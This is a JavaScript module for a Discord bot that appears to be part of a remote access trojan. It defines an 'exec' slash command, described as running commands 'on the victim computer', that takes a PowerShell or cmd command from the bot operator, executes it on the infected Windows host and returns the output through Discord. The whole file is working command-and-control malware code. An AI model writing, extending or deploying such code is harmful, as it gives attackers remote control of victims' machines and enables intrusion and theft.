const { ApplicationCommandOptionType } = require("discord.js"),
{executeCommand, executePowerShellCommand} = require("../../modules/Command");

module.exports = {
  name: "exec",
  ownerOnly: true,
  description: "Exec a specific command on the victim computer",
  options: [
    {
      name: "powershell",
      description: "Windows Powershell",
      type: ApplicationCommandOptionType.Subcommand,
      options: [
        {
          name: "command",
          description: "Command...",
          required: true,
          type: ApplicationCommandOptionType.String,
        },
      ],
    },
    {
      name: "cmd",
      description: "Windows Command Prompt",
      type: ApplicationCommandOptionType.Subcommand,
      options: [
        {
          name: "command",
          description: "Command...",
          required: true,
          type: ApplicationCommandOptionType.String,
        },
      ],
    },
  ],
  run: async (client, interaction, args) => {
    const inter = interaction.options.getSubcommand();
    if (inter === "cmd") {
      await interaction.reply({
        content: `Wait...`,
        ephemeral: true,
      });
      const interv = interaction.options.getString("command");
      let outputChunks = await executeCommand(interv);
      for (const chunk of outputChunks) {
        await interaction.followUp({
          content: `\`\`\`${chunk}\`\`\``,
          ephemeral: true,
        });
      }
    }
    if (inter === "powershell") {
      await interaction.reply({
        content: `Wait...`,
        ephemeral: true,
      });
      const interv = interaction.options.getString("command");
      let output = await executePowerShellCommand(interv);
      interaction.editReply({
        content: output,
        ephemeral: true,
      });
    }
  },
};
